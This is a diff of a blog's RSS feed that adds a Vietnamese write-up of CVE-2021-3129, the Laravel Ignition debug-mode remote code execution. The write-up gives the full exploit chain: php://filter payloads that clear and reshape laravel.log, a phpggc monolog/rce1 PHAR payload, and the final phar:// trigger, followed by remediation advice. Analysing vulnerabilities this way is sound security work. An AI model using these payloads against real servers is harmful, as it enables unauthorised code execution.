@@ -3,9 +3,261 @@
         <title>Tu dep trai</title>
         <link>https://g03m0n.github.io/</link>
         <description>g03m0n</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 01 May 2024 08:29:01 &#43;0800</lastBuildDate>
             <atom:link href="https://g03m0n.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
+    <title>CVE-2021-3129</title>
+    <link>https://g03m0n.github.io/posts/cve-2021-3129/cve-2021-3129/</link>
+    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2021-3129/cve-2021-3129/</guid>
+    <description><![CDATA[<h1 id="laravel--v842-debug-mode-remote-code-execution-cve-2021-3129"><strong>Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</strong></h1>
+<h1 id="description-and-impact"><strong>Description and Impact</strong></h1>
+<p>Ignition là một công cụ gỡ lỗi phổ biến trong Laravel, đóng một vai trò quan trọng trong việc hỗ trợ các nhà phát triển trong quá trình phát triển ứng dụng. Nó được cài đặt mặc định từ Laravel 6+.</p>
+<p>Ngoài ra Ignition còn cung cấp các mô-đun hay còn gọi là  <code>Solutions</code> , giúp ta tìm và sửa lỗi một cách dễ dàng và nhanh chóng.</p>
+<p></p>
+<p>Tuy nhiên, chức năng của nó đi kèm với một lỗ hổng khiến các trang web sử dụng phiên bản Laravel &lt;= 8.4.2 với chế độ DEBUG được bật có nguy cơ bị tấn công RCE. Lỗ hổng nghiêm trọng này cho phép những kẻ tấn công không được xác thực thực thi mã tùy ý từ xa, có khả năng phá hoại dữ liệu ứng dụng, tài nguyên máy chủ và quyền riêng tư của người dùng.</p>
+<h1 id="root-cause-analysis"><strong>Root Cause Analysis</strong></h1>
+<h2 id="ignition-debug-example">Ignition debug example</h2>
+<p>Sửa hoặc thêm <code>{{ $varialbe }}</code> vào file <code>/resource/views/welcome.blade.php</code> để làm xuất hiện chế độ debug của <code>Ignition</code></p>
+<p></p>
+<p>Khi click vào <code>Make variable optional</code> thì nó sẽ tự động replace <code>{{ $varialbe }}</code> thành </p>
+<p><code>{{ $varialbe ?? '' }}</code>. Kiểm tra log thì ta thấy được request như sau:</p>
+<p></p>
+<p><strong>Trong gói tin này:</strong></p>
+<ul>
+<li>Param <code>solution</code> : Chỉ định <code>class</code>  sẽ được thực thi. Ở đây là class <code>MakeViewVariableOptionalSolution</code>.</li>
+<li><code>parameters</code>: Đây là một JSON Object bổ sung, chứa các params cụ thể cho <code>solution</code>.</li>
+<li>Param <code>variableName</code>: Đây là tên của biến trong view mà Ignition đề xuất để sửa.</li>
+<li>Param <code>viewFile</code>: Đây là đường dẫn tới file view chứa <code>variableName</code>.</li>
+</ul>
+<h2 id="phar-deserialization">Phar Deserialization</h2>
+<h3 id="deserialize-attack">Deserialize Attack</h3>
+<p>Là kỹ thuật mà attacker có thể control được object serialize thông qua đó có thể điều chỉnh được các giá trị của các thuộc tính trong một class tuỳ theo ý muốn, đồng thời lợi dụng điểm yếu của các magic method để thực thi code và tấn công. Điển hình là các lỗi về: <code>SQL injection</code>, <code>Code injection</code>,…</p>
+<h3 id="phar-stream-wrapper"><strong>phar:// Stream Wrapper</strong></h3>
+<p>Trong PHP, tất cả các thao tác với tệp đều được xử lý bằng <a href="https://www.php.net/manual/en/intro.stream.php" target="_blank" rel="noopener noreffer">stream</a>
+.</p>
+<p>Bằng cách sử dụng các Wrapper, ta có thể gọi một số hàm tương tự như <code>filegetcontents()</code> **để nạp hình ảnh từ một vị trí ở xa hoặc từ một thư mục được lưu trữ trên local disk.</p>
+<p>Ví dụ: <code>http://</code>, <code>ftp://</code>, <code>file://</code>, <code>php://</code>, <code>phar://</code>,…</p>
+<ul>
+<li>filegetcontents(&ldquo;<a href="http://example.com/image.jpeg%22" target="_blank" rel="noopener noreffer">http://example.com/image.jpeg"</a>
+)</li>
+<li>filegetcontents(&ldquo;file://../images/image.jpeg&rdquo;)</li>
+<li>filegetcontents(&ldquo;phar://./folder/app.phar&rdquo;)</li>
+</ul>
+<p>Đặc biệt, phar:// stream wrapper được sử dụng để tương tác với các tệp PHAR. Nó cho phép thực hiện nhiều thao tác <code>read</code>/<code>write</code> khác nhau trên server.</p>
+<h3 id="phar-archives"><strong>PHAR archives</strong></h3>
+<p>Cấu trúc của một file phar:</p>
+<p><strong><code>Stub</code>: Là một file PHP mà ta cần gói lại.</strong></p>
+<p>VD:   <strong><!-- raw HTML omitted --></strong></p>
+<p><strong><code>manifest</code> : Miêu tả về những nội dung chứa trong file.</strong></p>
+<p>Đặc biệt, ở <strong><strong>dòng thứ hai từ dưới lên</strong>,</strong> nó sẽ chứa những Meta-data đã được serialize và nó sẽ được unserialize nếu được trigger bởi các <code>filesystem function</code> khi gọi đến một file <code>Phar</code> thông qua <code>phar://</code> stream wrapper.</p>
+<p></p>
+<p>Một số <code>filesystem function</code>:</p>
+<p></p>
+<p><strong><code>File contents</code>: Nội dung chính của file.</strong></p>
+<p><strong><code>Signature</code>: Chữ ký để kiểm tra tính toàn vẹn.</strong></p>
+<ul>
+<li>
+<p>Điều kiện để có thể khai thác được Phar Deserialize:</p>
+<p>Ta phải load được một file có nội dung tùy ý và biết được đường dẫn đến file này trong hệ thống. Tìm được một <code>filesystem function</code> trên để trigger file phar và đồng thời ta phải control được tên của file.</p>
+</li>
+</ul>
+<h2 id="root-cause-analysis-1"><strong>Root Cause Analysis</strong></h2>
+<p>Lỗ hổng xảy ra ở solution <code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>. Tại đây, ứng dụng sử dụng hai hàm để <code>read</code> và <code>write</code> tệp trong PHP là: <code>file_get_contents()</code> và <code>file_put_contents()</code>. Sai lầm nghiêm trọng nằm ở việc thiếu xác thực trong việc kiểm tra input của người dùng, cụ thể là các biến môi trường được chuyển đến các chức năng này. Kẻ tấn công có thể khai thác lỗ hổng này bằng việc tiêm mã độc thông qua các biến môi trường, sau đó Ignition sẽ đọc và thực thi, cấp cho kẻ tấn công toàn quyền kiểm soát ứng dụng.</p>
+<p></p>
+<p>Luồng hoạt động của ứng dụng:</p>
+<p>Đầu tiên, phương thức <code>makeOptional()</code> sẽ được gọi:</p>
+<p></p>
+<p>Nó sẽ đọc một tập tin có đường dẫn được truyền trong tham số <code>viewFile</code>:</p>
+<p></p>
+<p>Sau đó, biến được truyền vào  <code>variableName</code> sẽ thay đổi định dạng từ <code>$variable</code> thành  <code>$variable ?? ''</code></p>
+<p></p>
+<p>Sau đó, chương trình sẽ thực hiện verify để đảm bảo rằng cấu trúc code không thay đổi:</p>
+<p></p>
+<p>Nếu có lỗi xảy ra, thì <code>makeOptional()</code> sẽ trả về lỗi, nếu không <code>$newContent</code> sẽ được ghi đè:</p>
+<p></p>
+<p></p>
+<p>Do đó, ta không thể làm được gì nhiều khi sử dụng param <code>variableName</code>.</p>
+<p>Input variable duy nhất còn lại là <code>viewFile</code>, từ đoạn code trên ta có thể viết lại đoạn code rút gọn như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> $originalContents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($parameters[<span style="color:#e6db74">&#39;viewFile&#39;</span>]);
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">file_put_contents</span>($parameters[<span style="color:#e6db74">&#39;viewFile&#39;</span>], $output);
+</span></span></code></pre></div><p>Trong Laravel, Laravel sử dụng thự viện <code>Monolog</code> được tích hợp sẵn để cung cấp và hỗ trợ nhiều cách xử lý log khác nhau. Mặc định có một file log được lưu trữ trong thư mục <code>storage/logs</code>.</p>
+<p>Khi ta truyền vào biến <code>viewFile</code> một đường dẫn không tồn tại, file log sẽ gi lại những gì chúng ta nhập.</p>
+<p></p>
+<p>Do đó, ta có thể kiểm soát được một phần nhỏ nội dung của tệp <code>laravel.log</code> bằng cách truyền payload vào biến <code>viewFile</code>.</p>
+<p>Vì ở đây ứng dụng sử dụng hàm <code>file_get_contents()</code> để đọc file nên ta sẽ sử dụng PHP Wrapper, cụ thể là <a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener noreffer">php://filter</a>
+ . Bằng cách sử dụng kết hợp các filter tích hợp, ta có thể chỉnh sửa nội dung của tệp trước khi được trả về.</p>
+<p></p>
+<p>E.g:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;hello&#39;</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">aGVsbG8K</span>
+</span></span></code></pre></div><p>Sau đó, viết một script PHP thực hiện các thao tác <code>read</code> và <code>write</code> file tương tự như các thao tác được sử dụng trong Ignition.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/convert.base64-decode/resource=/tmp/tu.txt&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Đọc file /tmp/tu.txt và base64-decode sau đó lưu vào biến $contents
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Base64-decode biến $contents sau đó ghi đè lên dữ liệu cũ
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">file_put_contents</span>($file, $contents);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tu</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hello</span>
+</span></span></code></pre></div><p>Khi decode-base64, base64 sẽ không decode những kí tự không nằm trong <code>[Base64 Encoding Alphabet](https://en.wikipedia.org/wiki/Base64)</code> mà loại bỏ chúng.</p>
+<p>E.g:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;SGVsbG8K!!!!;;&#39;</span> <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/read=convert.base64-decode/resource=/tmp/test.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_put_contents</span>($file, $contents);
+</span></span></code></pre></div><p></p>
+<p>Như vậy ta đã có đủ 2 điều kiện để sử dụng kỹ thuật Phar Deserialization: Kiểm soát được file <code>laravel.log</code> với Wrapper <code>php://filter</code> và biết được đường dẫn của file <code>laravel.log</code> là <code>storage/logs/laravel.log</code></p>
+<p>Nhưng ta mới chỉ kiểm soát được một phần nhỏ file log, để thực hiện kỹ thuật Phar Deserialization ta cần phải kiểm soát được toàn bộ nội dung của file log.</p>
+<p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Date</span>][<span style="color:#a6e22e">Error_data</span>]<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">viewFile</span><span style="color:#f92672">&gt;</span>[<span style="color:#a6e22e">Error_data</span>]<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">viewFile</span><span style="color:#f92672">&gt;</span>[<span style="color:#a6e22e">Error_data</span>]
+</span></span></code></pre></div><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
+ . Ta có thể xóa file log bằng cách chuyển đổi bảng mã <code>UTF-16</code> sang <code>UTF-8</code>. Vì cứ 2 byte thì sẽ được 1 char theo mã UTF-16 nên khi convert sang UTF-8 thì <code>H\0</code> -&gt; <code>H</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây và phần junk chars này sau đó sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>UTF-8</th>
+<th>UTF-16LE</th>
+<th>UTF-16BE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>U+0041 (a)</td>
+<td>0x41</td>
+<td>0x41 0x00</td>
+<td>0x00 0x41</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[Error_data]H\0e\0l\0l\0o\0[Error_data]H\0e\0l\0l\0o\0[Error_data]&#39;</span>
+</span></span><span style="display:flex;"><span>																			<span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($file); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">file_put_contents</span>($file, $contents); 
+</span></span></code></pre></div><p></p>
+<p>Vì payload xuất hiện 2 lần nên ta cần loại bỏ đi một cái mới đúng cấu trúc của file Phar. Ta chỉ cần thêm 1 byte vào cuối payload 1 và sử dụng cách trên convert payload từ <code>UTF16</code> sang <code>UTF8</code> để biến payload thứ 2 thành junk chars (vì <code>UTF16</code> làm việc với 2 byte nên byte alignment của payload thứ 2 sẽ bị lệch):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[Error_data]H\0e\0l\0l\0o\0a[Error_data]H\0e\0l\0l\0o\0a[Error_data]&#39;</span> 
+</span></span><span style="display:flex;"><span>																									<span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tmp</span><span style="color:#f92672">/</span><span style="color:#a6e22e">test</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><p></p>
+<p>Nhưng payload được truyền vào hàm <code>file_get_contents()</code> dưới dạng đường dẫn của tệp, do đó, ta sẽ không thể truyền vào các NULL byte (<code>\00</code>) để biểu diễn payload ở định dạng UTF-16. Nên ta có thể dùng ký tự <code>=00</code> sau đó sử dụng filter <a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable" target="_blank" rel="noopener noreffer">convert.quoted-printable</a>
+  ****để convert các ký tự <code>=00</code> thành NULL byte (<code>\00</code>).</p>
+<p></p>
+<p>Vậy, kết luận chúng ta sẽ có gadget-chain cuối cùng là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					|convert.iconv.utf-16le.utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p>Trong đó:</p>
+<ul>
+<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
+<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
+<li><code>convert.base64-decode</code>: xóa các byte bị convert sang utf-8 mà nằm ngoài bảng mã.</li>
+</ul>
+<p>Vì <code>UTF-16</code> cần phải là bội số của 2 byte, nên ta sẽ gửi hai request như dưới đây, vì các <code>Error_data[1,2,3]</code>sẽ xuất hiện hai lần và <code>PAYLOAD_A</code> và <code>PAYLOAD_B</code> cũng xuất hiện hai lần nên tổng số byte sẽ luôn là số chẵn. Để <code>PAYLOAD_A</code> biến mất khi decode-base64, ta sẽ gửi 1 payload với số byte chẵn như <code>AA</code> và biến <code>PAYLOAD_B</code> thành PHAR payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">PAYLOAD_A</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">PAYLOAD_A</span>[<span style="color:#a6e22e">Error_data3</span>]
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Error_data1</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data2</span>]<span style="color:#a6e22e">PAYLOAD_B</span>[<span style="color:#a6e22e">Error_data3</span>]
+</span></span></code></pre></div><ul>
+<li>
+<p>Note:</p>
+<p>Các <code>Error_data</code> có kích thước giống nhau vì nó gặp lỗi ở cùng một vị trí nên thông báo lỗi và stack trace sẽ giống nhau. Nên trong mọi trường hợp, kích thước của file log luôn là số chẵn.</p>
+</li>
+</ul>
+<p>Ta được quy trình khai thác sau:</p>
+<p>Xóa log → Gửi content ‘AA’ → Gửi ‘shell’ (các <code>Error_data</code> sẽ xuất hiện 2 lần) → Chẵn ký tự. Vì shell xuất hiện 2 lần nên dựa vào cấu trúc của <code>convert.iconv.utf-16le.utf-8</code> chỉ cần thêm 1 byte vào sau shell thì quá trình decode shell thứ 2 sẽ bị lệch byte và trở thành <code>junk chars</code> → Chạy PHAR deserialization.</p>
+<h2 id="create-payload-with-phpggc">Create Payload with PHPGGC</h2>
+<p>Ở đây ta sẽ sử dụng <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">phpggc</a>
+ để tạo payload. Công cụ này tạo ra các gadget-chains cho các cuộc tấn công PHP Deserialization. Và nó có thể tạo payload dưới dạng PHAR file với argument <code>--phar phar</code>.</p>
+<p>Như đã nói ở trên, <code>Monolog</code> là một thư viện có sẵn trong Laravel nên ta sẽ sử dụng gadget <code>monolog/rce1</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span><span style="color:#e6db74">&#39;phar.readonly=0&#39;</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">monolog</span><span style="color:#f92672">/</span><span style="color:#a6e22e">rce1</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;id&#39;</span> 
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">--</span><span style="color:#a6e22e">phar</span> <span style="color:#a6e22e">phar</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">o</span> <span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">output</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">python</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> 
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in input()]).upper())&#34;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Trong đó:</p>
+<p><code>-d'phar.readonly=0'</code>: Đây là tùy chọn dòng lệnh cho PHP cho phép sửa đổi các tệp Phar. Theo mặc định, PHP sẽ chỉ cho phép đọc tệp Phar, nhưng tùy chọn này cho phép ghi và sửa đổi nội dung của tệp Phar.</p>
+<p><code>print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in input()]).upper())</code>: chuyển từng ký tự thành mã Unicode của nó rồi chuyển mã Unicode thành mã Hex sau đó thêm ký tự &ldquo;=&rdquo; ở đầu và cuối mỗi chuỗi Hex và thêm chuỗi <code>00</code> ở cuối mỗi cặp Hex. Cuối cùng dùng hàm <code>join()</code> để ghép các chuỗi Hex thành một chuỗi duy nhất và dùng hàm <code>upper()</code> chuyển đổi tất cả các ký tự trong chuỗi thành ký tự in hoa.</p>
+</li>
+</ul>
+<h1 id="steps-to-reproduce"><strong>Steps to reproduce</strong></h1>
+<ol>
+<li>Đầu tiên, ta tiến hành xóa log trong file <code>laravel.log</code> bằng <code>consumed</code> filter.</li>
+</ol>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+<ol>
+<li>Gửi payload <code>AA</code> để căn chỉnh kích thước của file log.</li>
+</ol>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span></code></pre></div><p></p>
+<ol>
+<li>Tạo log chứa payload như <a href="https://www.notion.so/B-o-c-o-th-c-t-p-th-ng-5-2024-5390069267ae43a1abbd6864aeff3d9b?pvs=21" target="_blank" rel="noopener noreffer">trên</a>
+.</li>
+</ol>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;=50=00=44=00=39=00=77=00=61=00=48=00...=67=00=3D=00=3D=00a&#34;</span>
+</span></span></code></pre></div><p></p>
+<ol>
+<li>Convert file log sang PHAR file.</li>
+</ol>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			|convert.iconv.utf-16le.utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			|convert.base64-decode/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+<ul>
+<li>
+<p>Debug</p>
+<ul>
+<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+<ul>
+<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.iconv.utf-16le.utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+<ul>
+<li><code>convert.base64-decode</code>: xóa các byte bị convert sang utf-8 mà nằm ngoài bảng mã và convert file log sang PHAR file.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;php://filter/write=convert.base64-decode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						/resource=../storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+</li>
+</ul>
+<ol>
+<li>Chạy PHAR deserialization</li>
+</ol>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;viewFile&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;phar:///var/www/storage/logs/laravel.log&#34;</span>
+</span></span></code></pre></div><p></p>
+<h1 id="recommendation"><strong>Recommendation</strong></h1>
+<p>So sánh 2 file code, sau khi update Laravel đã thêm vào một hàm kiểm tra input của người dùng truyền qua param <code>viewFile</code> là <code>isSafePath()</code>. Hàm này có tác dụng kiểm tra xem input có bắt đầu bằng đường dẫn tuyệt đối <code>/</code>, đường dẫn tương đối <code>./</code> hoặc file có kết thúc bằng extention <code>blade.php</code> hay không, nếu không thì return <code>false</code>.</p>
+<p></p>
+<p>Nếu cần bật chế độ Debug trên môi trường non-local thì nên tắt chế độ Suggestion Solutions của Ignition bằng cách set <code>ignition.enable_runnable_solutions</code> thành <code>false</code> trong file <code>.env</code>.</p>
+<p></p>
+<p>Kể từ phiên bản Ignition <code>2.6.*</code> trở đi chế độ Debug Suggestion Solutions không thể bật ở môi trường non-local.</p>
+<h1 id="references">References</h1>
